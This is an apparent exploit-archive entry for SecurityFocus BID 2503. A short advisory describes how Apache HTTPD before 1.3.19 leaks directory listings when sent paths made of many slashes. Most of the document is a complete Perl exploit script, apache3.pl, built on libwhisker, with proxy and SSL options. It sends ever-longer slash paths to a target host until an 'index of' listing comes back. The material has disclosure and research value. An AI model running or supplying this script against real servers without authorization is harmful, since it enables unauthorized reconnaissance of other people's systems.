source: http://www.securityfocus.com/bid/2503/info

Apache HTTPD is the Apache Web Server, freely distributed and actively maintained by the Apache Software Foundation. It is a freely available and widely used software package, included with various implementations of the UNIX operating system and can be used on Microsoft Windows operating systems.

A problem in the package could allow directory indexing and path discovery. In a default configuration, Apache enables mod_dir, mod_autoindex, and mod_negotiation. However, by sending the Apache server a custom-crafted request consisting of a long path name created artificially by using numerous slashes, an attacker can cause these modules to misbehave, allowing the attacker to escape the error page and to gain a listing of the directory contents.

This vulnerability allows a malicious remote user to launch an information-gathering attack, which could potentially result in a compromise of the system. Additionally, this vulnerability affects all releases of Apache previous to 1.3.19. 

#!/usr/bin/perl
#
# orginal by farm9, Inc. (copyright 2001)
# then modified by Siberian (www.sentry-labs.com)
# with more modifications by rfp (www.wiretrip.net/rfp/)
#
##########################################################################

use libwhisker;
use Getopt::Std;

# apache3.pl
# this exploit was modified to use the libwhisker library, which gives
# HTTP/1.1, proxy, and SSL support.  Plus, small other changes.

$|++;
my (%hin,%hout,%args);

print "Apache Artificially Long Slash Path Directory Listing Exploit\n";
print "SecurityFocus BID 2503\n\n";
print "Original exploit code written by Matt Watchinski (www.farm9.com)\n";
print "Rewritten and fixed by Siberian (www.sentry-labs.com)\n";
print "Moved to libwhisker by rfp\n\n";

getopts("p:L:H:sP:R:h:",\%args);

if($args{h} eq ''){
 print 'Usage: ./apache3.pl <options>, where options:',"\n";
 print '-h host  host to scan (must be specified)',"\n";
 print '-p ##	 host port (default: 80)',"\n";
 print '-L ##	 low end/start of range (default: 1)',"\n";
 print '-H ##	 high end/end of range (default: 8192)',"\n";
 print '-P host	 HTTP proxy via host',"\n";
 print '-R ##	 HTTP proxy port (default: 80)',"\n";
 print '-s	 use SSL (can\'t be used with proxy)',"\n";
 exit 0;
}

$low =  $args{L} || 1;
$high = $args{H} || 8192;

&lw::http_init_request(\%hin);		# setup our request hash

$hin{'whisker'}->{'host'}= $args{h};

$hin{'whisker'}->{'port'}= $args{p} || 80;

if(defined $args{s}){
 	$hin{'whisker'}->{'ssl'} = 1; 

	if(defined $args{P}){
		print "SSL not currently compatible with proxy\n";
		exit 1; 
	}
}

if(defined $args{'P'}){
	$hin{'whisker'}->{'proxy_host'}=$args{P};
	$hin{'whisker'}->{'proxy_port'}=$args{R} || 80;
	print "Using proxy host $hin{'whisker'}->{'proxy_host'} on ";
	print "port $hin{'whisker'}->{'proxy_port'}\n";
}


&lw::http_fixup_request(\%hin);		# fix any HTTP requirements

for($c=$low; $c<=$high; $c++){

	$hin{'whisker'}->{'uri'} = '/' x $c;

	if(&lw::http_do_request(\%hin,\%hout)){
		print "Error: $hout{'whisker'}->{'error'}\n";
		exit 1;
	} else {
		if($hout{'whisker'}->{'http_resp'} == 200 &&
			$hout{'whisker'}->{'data'}=~/index of/i){

			print "Found result using $c slashes.\n";
			exit 0;
		}
	}

	print "."; # for status
}

print "\nNot vulnerable (perhaps try a different range).\n";